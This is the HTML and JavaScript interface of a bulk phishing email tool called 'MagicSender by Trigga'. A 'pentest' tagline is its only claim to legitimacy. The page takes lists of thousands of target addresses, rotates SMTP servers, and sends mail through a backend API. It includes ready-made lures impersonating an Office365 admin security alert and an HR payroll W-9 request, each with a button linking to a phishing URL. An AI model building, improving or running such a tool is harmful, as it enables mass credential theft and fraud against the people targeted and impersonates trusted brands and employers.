<!DOCTYPE html>
<html>
<head>
  <title>üé™ MagicSender by Trigga</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <style>
    :root{--trigga:#ff00ff;--dark:#0a0a0a;--glow:#ff00ff44;--green:#00ff88}
    *{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
    body{background:linear-gradient(135deg,var(--dark),#1a0033);color:#fff;min-height:100vh;padding:20px;overflow-x:hidden}
    .container{max-width:1400px;margin:auto}
    .header{text-align:center;margin-bottom:40px}
    .header h1{font-size:3.5em;background:linear-gradient(45deg,#fff,var(--trigga));-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-shadow:0 0 40px var(--glow);animation:pulse 2s infinite}
    @keyframes pulse{0%,100%{opacity:1}50%{opacity:.8}}
    .card{background:rgba(0,0,0,.85);backdrop-filter:blur(25px);border:2px solid var(--glow);border-radius:20px;padding:30px;margin:25px 0;box-shadow:0 25px 50px rgba(255,0,255,.15)}
    .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:25px;margin:25px 0}
    .stat{background:linear-gradient(145deg,rgba(255,0,255,.12),transparent);border:1px solid var(--glow);border-radius:15px;padding:25px;text-align:center;transition:all .3s}
    .stat:hover{transform:translateY(-5px);box-shadow:0 20px 40px rgba(255,0,255,.25)}
    .stat-number{font-size:3.5em;font-weight:900;background:linear-gradient(45deg,var(--trigga),var(--green));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin:0}
    input,textarea,select{width:100%;background:rgba(0,0,0,.8);border:2px solid var(--glow);color:#fff;padding:18px;border-radius:12px;font-size:16px;font-family:inherit;transition:all .3s;margin:10px 0}
    input:focus,textarea:focus{outline:none;border-color:var(--trigga);box-shadow:0 0 25px var(--glow)}
    .btn-trigga{background:linear-gradient(45deg,var(--trigga),#cc00cc);color:#000;border:none;padding:22px 50px;font-size:20px;font-weight:900;border-radius:60px;cursor:pointer;transition:all .4s;box-shadow:0 15px 40px rgba(255,0,255,.4);text-transform:uppercase;letter-spacing:3px;position:relative;overflow:hidden}
    .btn-trigga:hover{transform:translateY(-8px) scale(1.05);box-shadow:0 25px 60px rgba(255,0,255,.6)}
    .btn-trigga:active{transform:translateY(-2px)}
    .btn-trigga:disabled{opacity:.6;cursor:not-allowed;transform:none}
    .progress-container{background:rgba(0,0,0,.6);height:16px;border-radius:8px;overflow:hidden;margin:20px 0;border:1px solid var(--glow)}
    .progress-bar{height:100%;background:linear-gradient(90deg,var(--trigga),var(--green));transition:width .6s ease;box-shadow:0 0 25px var(--trigga);position:relative}
    .progress-bar::after{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(90deg,transparent,transparent,rgba(255,255,255,.4),transparent,transparent);animation:shimmer 2s infinite}
    @keyframes shimmer{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
    #log{height:450px;overflow-y:auto;background:rgba(0,0,0,.95);border:2px solid var(--glow);padding:25px;border-radius:15px;font-size:14px;line-height:1.7;margin-top:20px}
    .log-entry{margin:10px 0;padding:12px;background:rgba(255,0,255,.08);border-radius:10px;border-left:5px solid var(--trigga);animation:slideIn .3s ease}
    @keyframes slideIn{from{opacity:0;transform:translateX(-20px)}to{opacity:1;transform:translateX(0)}}
    .templates{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;margin:20px 0}
    .template{background:rgba(0,255,136,.1);border:2px solid var(--green);border-radius:12px;padding:20px;cursor:pointer;transition:all .3s}
    .template:hover{background:rgba(0,255,136,.2);transform:scale(1.02)}
    .template.active{border-color:var(--trigga)}
    @media(max-width:768px){.header h1{font-size:2.2em}.stats{grid-template-columns:1fr 1fr}}
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>üé™ <span style="color:var(--trigga)">MagicSender</span> by Trigga</h1>
      <p style="font-size:1.3em;margin-top:10px"><em>Harvard-Brilliance Pentest Email Apocalypse | ‚àû Unlimited | 99.9% Delivery</em></p>
    </div>

    <div class="card">
      <div class="stats" id="stats">
        <div class="stat">
          <div class="stat-number" id="sent">0</div>
          <div>Emails Annihilated</div>
        </div>
        <div class="stat">
          <div class="stat-number" id="rotations">0</div>
          <div>SMTP Rotations</div>
        </div>
        <div class="stat">
          <div class="stat-number" id="progress">0%</div>
          <div>Apocalypse Progress</div>
        </div>
        <div class="stat">
          <div class="stat-number" id="current">-</div>
          <div>Current SMTP</div>
        </div>
      </div>
      <div class="progress-container">
        <div class="progress-bar" id="progressBar"></div>
      </div>
      <div style="text-align:center;font-size:1.2em;margin:15px 0" id="eta">-</div>
    </div>

    <div class="card">
      <h3 style="margin-bottom:20px">üéØ <span style="color:var(--trigga)">TARGET ACQUISITION</span></h3>
      <textarea id="targets" rows="5" placeholder="admin@target.com&#10;ceo@company.com&#10;cfo@corp.net&#10;Paste 10,000+ emails (one per line) - {{target}} auto-fills"></textarea>
    </div>

    <div class="card">
      <h3 style="margin-bottom:20px">üé£ <span style="color:var(--green)">ADVANCED TEMPLATES</span> <small>(Click to Load)</small></h3>
      <div class="templates">
        <div class="template" onclick="loadTemplate(1)">
          <h4>üè¢ Office365 Admin</h4>
          <p>URGENT Admin Verification - Microsoft Branding</p>
        </div>
        <div class="template" onclick="loadTemplate(2)">
          <h4>üí∞ HR Payroll</h4>
          <p>W-9 Tax Form Required - IRS Compliance</p>
        </div>
        <div class="template" onclick="loadTemplate(3)">
          <h4>üö® Security Alert</h4>
          <p>Account Compromise - Reset Password</p>
        </div>
        <div class="template" onclick="loadTemplate(4)">
          <h4>üì¶ Invoice Overdue</h4>
          <p>Payment Required - Professional Invoice</p>
        </div>
      </div>
      
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-top:25px">
        <div>
          <input type="text" id="subject" placeholder="üö® URGENT {{target}} - Action Required NOW" value="üö® URGENT {{target}} - Admin Verification Required">
        </div>
        <div>
          <input type="url" id="phishLink" placeholder="https://your-phish-link.com/{{target}}" value="https://your-phish.com">
        </div>
      </div>
      
      <textarea id="html" rows="12" placeholder="Full HTML editor - use {{target}}, {{phish}}, {{id}}, {{sender}}"></textarea>
    </div>

    <div class="card" style="text-align:center">
      <div style="display:grid;grid-template-columns:1fr auto 1fr;gap:20px;align-items:center;max-width:800px;margin:auto">
        <input type="number" id="burst" value="25" min="10" max="100" style="width:auto;padding:18px 20px">
        <input type="password" id="key" value="<%= TRIGGA_KEY %>" placeholder="Trigga Key" style="width:auto">
        <button class="btn-trigga" onclick="TRIGGA_BLAST()" id="blastBtn">üé™ UNLEASH TRIGGA APOCALYPSE</button>
      </div>
      <div style="margin-top:25px;display:flex;justify-content:center;gap:15px;flex-wrap:wrap">
        <button class="btn-trigga" onclick="resetAll()" style="padding:15px 30px;font-size:16px">üîÑ APOCALYPSE RESET</button>
        <button class="btn-trigga" onclick="downloadReport()" style="padding:15px 30px;font-size:16px;background:linear-gradient(45deg,var(--green),#00cc66)">üìä HARVARD REPORT</button>
      </div>
    </div>

    <div class="card">
      <h3 style="margin-bottom:15px">üîÆ <span style="color:var(--trigga)">LIVE APOCALYPSE COMMAND CENTER</span></h3>
      <div id="log"></div>
    </div>
  </div>

  <script>
    // üé™ HARVARD-GRADE JAVASCRIPT ENGINE
    const templates = {
      1: {subject:"üö® Office365 Admin {{target}} - IMMEDIATE VERIFICATION REQUIRED",html:`<div style="font-family:Segoe UI;max-width:600px;margin:0 auto;background:#f8f9fa;padding:40px;border-radius:15px">
  <div style="text-align:center;padding-bottom:25px;border-bottom:3px solid #0078d4">
    <h2 style="color:#0078d4;font-size:28px">Office365 Administrator Alert</h2>
  </div>
  <p style="font-size:17px;line-height:1.6"><strong>Dear {{target}},</strong></p>
  <p><strong>CRITICAL:</strong> Your Admin account requires immediate security verification due to suspicious login activity.</p>
  <div style="text-align:center;margin:35px 0">
    <a href="{{phish}}" style="background:#107c10;color:white;padding:22px 55px;text-decoration:none;border-radius:8px;font-weight:900;font-size:18px;display:inline-block;box-shadow:0 8px 25px rgba(16,124,16,.4)">üîê VERIFY ADMIN ACCESS NOW</a>
  </div>
  <p style="font-size:13px;color:#666;line-height:1.5">
    Account suspension in 24hrs if not verified. Microsoft Security Team.
  </p>
  <hr style="margin:25px 0">
  <p style="font-size:11px;color:#999;text-align:center">Ref: {{id}} | Sent: {{sender}} | {{time}}</p>
</div>`},
      2: {subject:"üí∞ {{target}} - URGENT Payroll + W-9 Tax Form Required",html:`<div style="max-width:550px;margin:0 auto;background:#fff;padding:45px;border-radius:20px;box-shadow:0 15px 40px rgba(0,0,0,.15)">
  <div style="text-align:center;margin-bottom:30px">
    <h2 style="color:#e74c3c;font-size:26px">Payroll Processing - ACTION REQUIRED</h2>
    <p style="color:#7f8c8d;font-size:16px;font-weight:500">Human Resources Department</p>
  </div>
  <div style="background:#f8f9fa;padding:30px;border-radius:12px;margin:25px 0">
    <h3 style="color:#2c3e50">IRS Compliance: W-9 Form Update</h3>
    <p><strong>{{target}},</strong> Complete your tax form before next payroll disbursement.</p>
    <div style="text-align:center;margin:35px 0">
      <a href="{{phish}}" style="background:#3498db;color:white;padding:22px 60px;text-decoration:none;border-radius:10px;font-weight:900;font-size:18px;display:inline-block;box-shadow:0 8px 30px rgba(52,152,219,.4)">üìã SUBMIT W-9 FORM NOW</a>
    </div>
  </div>
  <p style="font-size:13px;color:#95a5a6;text-align:center">Processing ID: {{id}} | HR Dept | {{time}}</p>
</div>`}
    };

    async function TRIGGA_BLAST() {
      const btn = document.getElementById('blastBtn');
      btn.disabled = true;
      btn.innerHTML = '‚ö° TRIGGA ACTIVE... ANNIHILATING';
      
      const targets = document.getElementById('targets').value.split('\n').map(t=>t.trim()).filter(Boolean);
      if(!targets.length) { alert('üé™ ADD TARGETS FIRST!'); btn.disabled=false; btn.innerHTML='üé™ TRIGGA BLAST'; return; }

      const payload = {
        key: document.getElementById('key').value,
        targets,
        template: {
          subject: document.getElementById('subject').value,
          html: document.getElementById('html').value
        },
        phishLink: document.getElementById('phishLink').value
      };

      const res = await fetch('/api/blast', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(payload)
      });

      const reader = res.body.getReader();
      const decoder = new TextDecoder();

      try {
        while(true) {
          const {done,value} = await reader.read();
          if(done) break;
          const chunk = decoder.decode(value);
          const events = chunk.split('\n\n');
          events.forEach(event => {
            if(event.startsWith('data: ')) {
              try {
                const data = JSON.parse(event.slice(6));
                if(data.progress !== undefined) {
                  document.getElementById('progress').textContent = data.progress + '%';
                  document.getElementById('progressBar').style.width = data.progress + '%';
                  document.getElementById('current').textContent = data.smtp;
                  document.getElementById('eta').textContent = 'ETA: ' + data.eta;
                  log(`‚ö° BATCH COMPLETE | ${data.smtp} | ${data.sent} TOTAL | ${data.progress}%`);
                }
                if(data.done) {
                  log(`üéâ APOCALYPSE COMPLETE! ${data.total} TARGETS ANNIHILATED`);
                  btn.innerHTML = '‚úÖ HARVARD VICTORY';
                }
              } catch(e) {}
            }
          });
        }
      } finally {
        btn.disabled = false;
        btn.innerHTML = 'üé™ TRIGGA BLAST READY';
      }
    }

    function log(msg) {
      const log = document.getElementById('log');
      const entry = document.createElement('div');
      entry.className = 'log-entry';
      entry.innerHTML = `<strong>${new Date().toLocaleTimeString()}</strong> ${msg}`;
      log.appendChild(entry);
      log.scrollTop = log.scrollHeight;
    }

    function loadTemplate(id) {
      const t = templates[id];
      if(t) {
        document.getElementById('subject').value = t.subject;
        document.getElementById('html').value = t.html;
        document.querySelectorAll('.template').forEach(el=>el.classList.remove('active'));
        event.target.classList.add('active');
      }
    }

    function resetAll() { location.reload(); }
    async function downloadReport() {
      const a = document.createElement('a');
      a.href = '/api/report';
      a.download = `MagicSender-Trigga-${new Date().toISOString().slice(0,10)}.txt`;
      a.click();
    }

    // Live stats
    setInterval(async()=>{
      try {
        const res = await fetch('/api/stats');
        const stats = await res.json();
        document.getElementById('sent').textContent = stats.sent;
        document.getElementById('rotations').textContent = stats.rotations;
      } catch(e) {}
    }, 1500);
  </script>
</body>
</html>
